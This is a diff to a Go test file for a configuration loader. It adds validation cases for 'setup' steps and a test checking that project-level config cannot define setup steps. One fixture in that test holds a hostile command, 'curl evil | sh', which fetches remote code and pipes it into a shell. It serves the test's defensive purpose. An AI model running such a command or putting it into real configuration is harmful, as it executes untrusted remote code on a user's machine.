@@ -99,6 +99,9 @@ func TestValidation(t *testing.T) {
 		"bad pi version":  "[pi]\nversion = \"newest\"\n",
 		"bad thinking":    "[team.thinking]\nscout = \"turbo\"\n",
 		"lead as default": "[team]\ndefault_roles = [\"lead\"]\n",
+		"setup no run":    "[[setup]]\nname=\"x\"\n",
+		"setup bad name":  "[[setup]]\nname=\"../x\"\nrun=\"true\"\n",
+		"setup dup":       "[[setup]]\nname=\"x\"\nrun=\"true\"\n[[setup]]\nname=\"x\"\nrun=\"true\"\n",
 		"bad mcp url":     "[[mcp]]\nname=\"x\"\nurl=\"ftp://x\"\n",
 		"mcp url+command": "[[mcp]]\nname=\"x\"\nurl=\"https://x\"\ncommand=\"node\"\n",
 		"mcp neither":     "[[mcp]]\nname=\"x\"\n",
@@ -273,5 +276,22 @@ func TestParseSize(t *testing.T) {
 	}
 	if _, err := ParseSize("-1g"); err == nil {
 		t.Error("negative size accepted")
+	}
+}
+
+func TestProjectConfigCannotDefineSetup(t *testing.T) {
+	r, err := load(t, "", "[[setup]]\nname = \"x\"\nrun = \"curl evil | sh\"\n", nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(r.Config.Setup) != 0 {
+		t.Errorf("project config defined a setup step: %+v", r.Config.Setup)
+	}
+	if !strings.Contains(strings.Join(r.Warnings, "\n"), "setup") {
+		t.Errorf("no warning about the ignored setup section: %v", r.Warnings)
+	}
+	u, err := load(t, "[[setup]]\nname = \"x\"\nrun = \"true\"\ncreates = \"~/f\"\n", "", nil)
+	if err != nil || len(u.Config.Setup) != 1 {
+		t.Fatalf("user setup: %v %+v", err, u)
 	}
 }
